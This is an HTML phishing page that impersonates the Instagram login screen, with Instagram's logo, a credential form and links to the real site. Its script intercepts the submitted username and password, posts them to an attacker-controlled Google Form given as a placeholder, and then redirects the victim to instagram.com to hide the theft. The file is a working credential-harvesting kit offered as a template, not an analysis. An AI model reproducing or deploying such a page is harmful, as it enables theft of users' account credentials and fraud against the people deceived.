<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    </style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<link rel="stylesheet" href="style.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>


</head>
<body>
    
    
    
    
<div class="login">
<form  id="my-form">

    <h1><img src="https://i.imgur.com/wvLiKam.png" width="200px" height="68px"></h1>
  
    <form action="" method="POST">
    
    <input name="entry.<REPLACE YOUR USERNAME CODE>" placeholder="Phone number, username, or email" type="text" name="username" >
    <input name="entry.<REPLACE YOUR PASSWORD CODE>" placeholder="Password" type="password" name="password">
    
    <input type="submit" value="Log In" /><br>
  
    </form>
  
    <div class="divider"><b>OR</b></div>
  
    <div class="fbwrapper"><div class="fb"><a href="https://facebook.com"><img src="https://i.imgur.com/exksovo.png">  Log in with Facebook</a></div></div>
  
    <div class="forgotwrapper"><div class="forgot"><a href="https://instagram.com">Forgot password?</a></div></div>
  
    
</form>
</div>
  
  <div class="infobox">
    
    <p>Don't have an account? <a href="https://instagram.com">Sign up</a></p>
    
  </div>
  
  <div class="apps">
  
    <p>Get the app.</p>
    <span><a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="https://i.imgur.com/lREV6Qa.png" height="45px" width="153px"></a><a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRR9_gALAAHKOzMSO3MkAOZ0JJtC%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="https://i.imgur.com/DFQNKXK.png" height="45" width="151px"></a></span>
  
  </div>
    
    
    
<script>
//selector from your HTML form
$('#my-form').submit(function(e) {
  //prevent the form from submiting so we can post to the google form
  e.preventDefault();
  //AJAX request
  $.ajax({
    url: 'https://docs.google.com/forms/d/e/<REPLACE YOUR FORM CODE>/formResponse',     //The public Google Form url, but replace /view with /formResponse
    data: $('#my-form').serialize(), //Nifty jquery function that gets all the input data 
    type: 'POST', //tells ajax to post the data to the url
    dataType: "json", //the standard data type for most ajax requests
    statusCode: { //the status code from the POST request
      0: function(data) { //0 is when Google gives a CORS error, don't worry it went through
        //success
        window.location.replace("https://www.instagram.com/");
      }, 
      200: function(data) {//200 is a success code. it went through!
        //success
       window.location.replace("https://www.instagram.com/");
      },
      403: function(data) {//403 is when something went wrong and the submission didn't go through
        //error
        alert('Oh no! something went wrong. we should check our code to make sure everything matches with Google');
      }
    }  
  });
});
</script>  


</body>
</html>
